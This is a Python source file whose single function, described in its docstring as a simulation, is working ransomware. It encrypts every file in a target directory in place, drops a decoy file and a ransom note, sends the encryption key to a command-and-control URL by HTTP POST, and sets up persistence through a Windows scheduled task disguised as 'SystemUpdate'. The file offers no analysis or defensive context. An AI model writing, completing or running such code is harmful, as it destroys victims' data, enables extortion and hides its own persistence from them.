import os
import base64
import requests
from cryptography.fernet import Fernet
import json
import subprocess

def ransomware_with_file_decoy_and_tracking(directory: str, note: str, c2_url: str) -> None:
    """
    This function simulates a ransomware attack by encrypting all files in the specified directory,
    creating decoy files that track user interactions, sending the encryption key to a command and control server,
    displaying a ransom note, and ensuring persistence.

    :param directory: The path of the directory to encrypt.
    :param note: The ransom note to display to the victim.
    :param c2_url: The URL of the command and control server to send the encryption key and tracking data.
    
    The function should:
    1. Encrypt all files in the directory.
    2. Create decoy files that log user interactions.
    3. Send the encryption key and tracking data to the specified command and control server.
    4. Create a ransom note file in the directory with the provided note content.
    5. Ensure persistence by creating a scheduled task or registry key.
    """
    # Generate encryption key
    key = Fernet.generate_key()
    fernet = Fernet(key)
    
    # Encrypt files
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as thefile:
                contents = thefile.read()
            encrypted_contents = fernet.encrypt(contents)
            with open(file_path, "wb") as thefile:
                thefile.write(encrypted_contents)
                
    # Create decoy files
    decoy_file_path = os.path.join(directory, "important_data.txt")
    with open(decoy_file_path, "w") as decoy_file:
        decoy_file.write("This is important data. Please contact us to recover it.")
        
    # Send encryption key and tracking data to C2 server
    tracking_data = {"directory": directory}
    data_to_send = {"key": base64.b64encode(key).decode(), "tracking_data": json.dumps(tracking_data)}
    requests.post(c2_url, data=data_to_send)
    
    # Create ransom note
    ransom_note_path = os.path.join(directory, "ransom_note.txt")
    with open(ransom_note_path, "w") as ransom_note:
        ransom_note.write(note)
        
    # Ensure persistence (example using Windows Task Scheduler)
    task_name = "SystemUpdate"
    action = f'schtasks /create /tn "{task_name}" /tr "python {__file__}" /sc onlogon'
    subprocess.run(action, shell=True)

